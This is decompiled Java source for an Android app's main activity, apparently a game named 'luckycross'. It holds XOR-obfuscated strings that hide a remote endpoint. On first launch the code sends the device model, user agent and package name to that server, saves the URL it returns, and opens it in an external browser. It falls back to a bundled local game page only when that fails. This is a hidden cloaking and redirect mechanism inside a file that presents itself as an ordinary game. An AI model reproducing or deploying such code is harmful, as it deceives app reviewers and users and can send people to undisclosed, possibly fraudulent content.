package com.linetic.luckycross;

import H.e;
import K.A0;
import K.y0;
import P0.c;
import T.u;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.linetic.luckycross.MainActivity;
import com.linetic.luckycross.R;
import e1.l;
import g.AbstractActivityC0126i;
import g.C0124g;
import g.C0125h;
import i1.m;
import i1.o;
import i1.p;
import j1.b;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.TimeUnit;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0126i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1867D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1868A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1869B;

    /* renamed from: C, reason: collision with root package name */
    public String f1870C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1871y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1872z;

    public MainActivity() {
        this.d.f2379b.e("androidx:appcompat", new C0124g(this));
        h(new C0125h(this));
        this.f1871y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1867D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1872z = t(new byte[]{2, -75, -122});
        this.f1868A = t(new byte[]{19, -90, -109, -12});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {97, 211, 225, 152};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1915a);
    }

    @Override // g.AbstractActivityC0126i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1869B = getSharedPreferences(this.f1872z, 0);
        setContentView(((O0.a) this.f1871y.a()).f617a);
        u();
        WebSettings settings = ((O0.a) this.f1871y.a()).f618b.getSettings();
        d.d(settings, "getSettings(...)");
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((O0.a) this.f1871y.a()).f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1869B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1868A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1870C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{94, -78, -111, -24, 92});
        String str = t(new byte[]{9, -89, -107, -24, 18, -23, -50, -73, 22, -70, -113, -20, 4, -95, -52, -2, 19, -68, -110, -20, 76, -25, -45, -6, 5, -3, -115, -31, 21, -91, -105, -17, 15, -80, -126, -75, 15, -78, -107, -3, 4, -28, -41, -74, 22, -68, -109, -13, 4, -95, -110, -74, 5, -74, -105, -73}) + t2 + packageName;
        o oVar = new o();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        d.e(timeUnit, "unit");
        byte[] bArr = b.f2606a;
        long millis = timeUnit.toMillis(5L);
        if (millis > 2147483647L) {
            throw new IllegalArgumentException("timeout".concat(" too large.").toString());
        }
        if (millis == 0) {
            throw new IllegalArgumentException("timeout".concat(" too small.").toString());
        }
        oVar.f2475r = (int) millis;
        p pVar = new p(oVar);
        u uVar = new u(4);
        d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        uVar.f752a = lVar.a();
        String t3 = t(new byte[]{57, -2, -91, -3, 23, -70, -126, -3, 76, -98, -114, -4, 4, -65});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        uVar.l(t3, str2);
        uVar.l(t(new byte[]{32, -80, -126, -3, 17, -89, -52, -44, 0, -67, -122, -19, 0, -76, -124}), t(new byte[]{4, -67, -52, -51, 50, -1, -124, -10, 90, -94, -36, -88, 79, -22}));
        String t4 = t(new byte[]{52, -96, -124, -22, 76, -110, -122, -3, 15, -89});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.l(t4, defaultUserAgent);
        e b2 = uVar.b();
        j jVar = new j(pVar, b2);
        B.j jVar2 = new B.j(this, this.f1868A);
        if (!jVar.f3234e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3574a;
        jVar.f3235f = n.f3574a.g();
        u uVar2 = pVar.f2481a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f753b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) uVar2.f754c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m) gVar.f3228c.f3232b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f753b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m) gVar.f3228c.f3232b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3227b = gVar2.f3227b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0126i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1870C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1871y.a()).f618b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{7, -70, -115, -3, 91, -4, -50, -73, 0, -67, -123, -22, 14, -70, -123, -57, 0, -96, -110, -3, 21, -4, -120, -10, 5, -74, -103, -74, 9, -89, -116, -12}));
    }

    public final void w(String str) {
        ((O0.a) this.f1871y.a()).f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
